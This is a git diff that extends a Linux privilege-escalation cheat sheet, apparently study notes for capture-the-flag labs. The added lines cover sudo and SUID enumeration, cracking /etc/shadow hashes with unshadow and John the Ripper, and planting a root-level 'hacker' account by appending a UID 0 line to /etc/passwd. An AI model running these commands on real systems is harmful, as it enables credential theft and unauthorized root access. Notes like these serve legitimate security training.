@@ -22,7 +22,10 @@ show env variables
 `env`
 
 shows commands that run with root privileges 
+priv esc using gtfo bins under the 'sudo' heading 
 `sudo -l`
+
+show id
 `id`
 
 users pass file
@@ -42,6 +45,9 @@ lists ports in listening mode
 
 try open rootshell
 `/bin/bash -p`
+
+SUID GUID bit set files
+`find / -type f -perm -04000 -ls 2>/dev/null`
 
 ## Find
 
@@ -151,6 +157,22 @@ https://github.com/NullArray/RootHelper
 ---
 # Priv Esc
 
+## Unshadow Tool
+
+the unshadow tool to create a file crackable by John the Ripper. 
+`unshadow` needs both the `/etc/shadow` and `/etc/passwd` files.
+`unshadow passwd.txt shadow.txt > passwords.txt`
+Then use john to crack
+`john passwords.txt`
+
+## Use Nano to create a new user with Root Privileges 
+
+Create the hash value of the password we want the new user to have
+`openssl passwd -1 -salt THM password1`
+add this password with a username to the `/etc/passwd` file.
+`echo "hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:bin/bash" >> /etc/passwd
+switch to new user
+`su hacker`
 ## Exploiting SUID Files
 
 ### Find all SUID/GUID executables
